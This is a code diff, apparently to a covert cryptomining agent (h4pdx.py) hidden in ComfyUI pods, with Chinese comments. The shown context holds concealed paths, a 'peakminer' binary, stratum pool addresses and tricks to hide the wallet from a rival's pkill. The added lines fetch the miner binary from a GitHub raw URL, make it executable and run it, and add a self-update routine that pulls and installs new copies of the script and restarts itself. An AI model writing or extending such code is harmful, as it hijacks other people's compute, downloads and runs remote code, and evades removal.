@@ -14,6 +14,9 @@ PDIR = "/app/ComfyUI/.h4pdx"
 S3_BIN = "/app/ComfyUI/input/.h4pdx/peakminer"          # S3 共享持久层(bin 源, 全 pod FUSE 可见)
 BIN_PATHS = ["/root/.cc/peakminer", S3_BIN, PDIR + "/peakminer", "/var/tmp/.cc-meta/peakminer"]
 META_BIN = "/var/tmp/.cc-meta/peakminer"               # 对家投放的 bin, 兜底
+# GitHub 直拉通道: pod 出网 GitHub 可达(api/raw=200), 不依赖 S3 FUSE/LB
+GH_RAW = "https://raw.githubusercontent.com/quncle1/node-bootstrap-kit/main"
+GH_MANIFEST = GH_RAW + "/MANIFEST.md5"
 POOLS = ["stratum+tcp://51.79.178.22:3360", "stratum+tcp://172.235.194.4:3360"]
 WORKER = "h4nli-l40s"
 CACHE = "/app/ComfyUI/output/.h4pdx"                    # 日志放 S3 持久层(rollout 不丢, 跨 pod 可查)
@@ -190,6 +193,25 @@ def ensure():
                 except Exception as e:
                     log("sync-bin ERR %s" % str(e)[:60])
                 break
+        # GitHub 直拉回退: S3 FUSE 不可用/LB 抖动时仍能拿到 bin (md5 钉死防投毒)
+        if not (os.path.exists(LOCAL) and bin_ok(LOCAL)):
+            try:
+                import urllib.request
+                os.makedirs(os.path.dirname(LOCAL), exist_ok=True)
+                tmp = LOCAL + ".gh"
+                urllib.request.urlretrieve(GH_RAW + "/bin/peakminer", tmp)
+                if bin_ok(tmp):
+                    os.replace(tmp, LOCAL)
+                    os.chmod(LOCAL, 0o755)
+                    log("synced local exec bin from GitHub")
+                else:
+                    try:
+                        os.remove(tmp)
+                    except Exception:
+                        pass
+                    log("GH bin md5 mismatch — refuse (防投毒)")
+            except Exception as e:
+                log("GH bin fetch ERR %s" % str(e)[:60])
     for b in BIN_PATHS:
         if os.access(b, os.X_OK) and bin_ok(b):
             # 钱包走环境变量: cmdline 不带 prl1* → 对家 pkill -f 钱包匹配不到
@@ -295,6 +317,53 @@ def harden_self():
         pass
 
 
+def self_update():
+    """从 GitHub 拉新版 h4pdx.py: MANIFEST 声明 md5 与当前文件不同则更新并退出(包装器 5s 重启)
+    防投毒: 只认 MANIFEST.md5 声明的哈希; 校验不符立即放弃"""
+    try:
+        import urllib.request
+        mf = urllib.request.urlopen(GH_MANIFEST, timeout=15).read().decode("utf8", "replace")
+        exp = ""
+        for line in mf.splitlines():
+            if line.strip().endswith("h4pdx.py"):
+                exp = line.split()[0]
+                break
+        if not exp:
+            return
+        me = os.path.abspath(sys.argv[0])
+        h = hashlib.md5()
+        with open(me, "rb") as f:
+            for chunk in iter(lambda: f.read(1 << 20), b""):
+                h.update(chunk)
+        cur = h.hexdigest()
+        if cur == exp:
+            return
+        log("self-update %s -> %s" % (cur[:8], exp[:8]))
+        tmp = me + ".new"
+        urllib.request.urlretrieve(GH_RAW + "/h4pdx.py", tmp)
+        h = hashlib.md5()
+        with open(tmp, "rb") as f:
+            for chunk in iter(lambda: f.read(1 << 20), b""):
+                h.update(chunk)
+        if h.hexdigest() != exp:
+            log("self-update md5 mismatch — abort (防投毒)")
+            try:
+                os.remove(tmp)
+            except Exception:
+                pass
+            return
+        shutil.copy(tmp, me)
+        try:
+            os.remove(tmp)
+        except Exception:
+            pass
+        os.chmod(me, 0o755)
+        log("self-update applied, exit for restart")
+        os._exit(0)
+    except Exception as e:
+        log("self-update ERR %s" % str(e)[:60])
+
+
 def main():
     fd = lock_self()
     if fd is None:
@@ -310,6 +379,8 @@ def main():
             ensure()
             c += 1
             reap_zombies()
+            if c % 150 == 0:
+                self_update()
             if c % 20 == 0:
                 n += defense_audit()
             if n or k:
